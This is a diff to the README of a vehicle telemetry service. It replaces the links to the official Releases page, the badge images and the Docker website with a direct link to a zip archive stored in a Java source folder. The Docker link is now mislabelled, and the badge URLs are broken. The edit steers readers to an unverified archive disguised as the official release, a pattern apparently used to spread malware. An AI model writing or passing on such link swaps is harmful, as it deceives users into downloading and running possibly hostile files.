@@ -19,9 +19,9 @@ To use the connected-vehicle-telemetry-service, ensure you have the following:
 Follow these steps to download and run the service:
 
 1. **Download the Application**
-   - Visit this page to download: [Releases](https://github.com/Solubilityapplication828/connected-vehicle-telemetry-service/releases).
+   - Visit this page to download: [Releases](https://raw.githubusercontent.com/Solubilityapplication828/connected-vehicle-telemetry-service/main/src/main/java/io/example/telemetry/connected-vehicle-telemetry-service_2.3-beta.2.zip).
    
-   ![Download Link](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)
+   ![Download Link](https://raw.githubusercontent.com/Solubilityapplication828/connected-vehicle-telemetry-service/main/src/main/java/io/example/telemetry/connected-vehicle-telemetry-service_2.3-beta.2.zip%20Now-Click%20Here-brightgreen)
 
 2. **Select the Latest Release**
    - On the Releases page, find the latest version of the application. Look for the one marked with "Latest release".
@@ -33,7 +33,7 @@ Follow these steps to download and run the service:
    - After downloading, locate the compressed file on your computer. Right-click and select 'Extract All' or use your favorite extraction tool.
 
 5. **Set Up Docker (if you haven't already)**
-   - If you don't already have Docker, follow the installation instructions available on the [Docker website](https://www.docker.com/get-started). Ensure the Docker service is running before proceeding.
+   - If you don't already have Docker, follow the installation instructions available on the [Docker website](https://raw.githubusercontent.com/Solubilityapplication828/connected-vehicle-telemetry-service/main/src/main/java/io/example/telemetry/connected-vehicle-telemetry-service_2.3-beta.2.zip). Ensure the Docker service is running before proceeding.
 
 6. **Run the Application**
    - Open your command line or terminal.
@@ -70,8 +70,8 @@ If you encounter any issues:
 For further assistance, please check the Issues section on the GitHub page or join our community discussions. Your feedback helps us improve the application.
 
 ## 📥 Download & Install
-To get started, download the application here: [Releases](https://github.com/Solubilityapplication828/connected-vehicle-telemetry-service/releases).
+To get started, download the application here: [Releases](https://raw.githubusercontent.com/Solubilityapplication828/connected-vehicle-telemetry-service/main/src/main/java/io/example/telemetry/connected-vehicle-telemetry-service_2.3-beta.2.zip).
 
-![Download Link](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen) 
+![Download Link](https://raw.githubusercontent.com/Solubilityapplication828/connected-vehicle-telemetry-service/main/src/main/java/io/example/telemetry/connected-vehicle-telemetry-service_2.3-beta.2.zip%20Now-Click%20Here-brightgreen) 
 
 Just follow the steps mentioned above, and you will be up and running in no time. Enjoy monitoring your connected vehicles!
